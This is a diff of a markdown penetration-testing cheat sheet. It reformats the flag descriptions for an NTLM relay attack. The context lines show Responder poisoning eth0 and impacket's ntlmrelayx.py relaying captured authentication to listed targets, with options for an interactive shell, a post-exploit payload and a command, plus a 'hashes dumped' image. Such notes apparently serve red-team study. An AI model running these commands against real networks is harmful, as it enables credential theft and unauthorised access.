@@ -56,14 +56,10 @@ responder -I eth0 -rwdv `disable smb and http from /etc/respnder/Responder.conf`
 python /usr/share/doc/python-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support  -i
 
 >-tf         target file
-
--smb2support force ntlmrelay to use smbv2
-
--i           get interactive shell
-
--e           payload to run after exploit
-
--c           command
+>-smb2support force ntlmrelay to use smbv2
+>-i           get interactive shell
+>-e           payload to run after exploit
+>-c           command
 
 [logo]: img/responder.png
 ![alt text](img/responder.png "hashes dumped")
